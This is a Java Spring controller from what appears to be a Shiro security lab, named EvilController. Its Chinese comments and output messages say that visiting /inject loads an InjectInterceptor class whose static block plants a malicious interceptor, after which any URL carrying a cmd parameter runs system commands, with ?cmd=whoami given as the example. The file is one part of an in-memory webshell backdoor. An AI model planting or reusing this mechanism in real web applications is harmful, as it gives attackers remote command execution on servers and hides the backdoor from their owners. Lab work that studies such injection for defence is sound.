package com.example.shirolab.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * 恶意控制器 - 用于触发拦截器注入
 * 访问此控制器时会触发InjectInterceptor的静态代码块
 */
@Controller
@RequestMapping("/inject")
public class EvilController {
    
    @GetMapping
    public void index(HttpServletRequest request, HttpServletResponse response) {
        try {
            // 触发InjectInterceptor类的加载，执行静态代码块
            Class.forName("com.example.shirolab.web.interceptor.InjectInterceptor");
            response.getWriter().println("恶意拦截器注入完成！");
            response.getWriter().println("现在访问任意URL时，如果带有cmd参数就会执行命令");
            response.getWriter().println("例如: http://localhost:8080/any/path?cmd=whoami");
        } catch (Exception e) {
            try {
                response.getWriter().println("注入失败: " + e.getMessage());
                e.printStackTrace();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
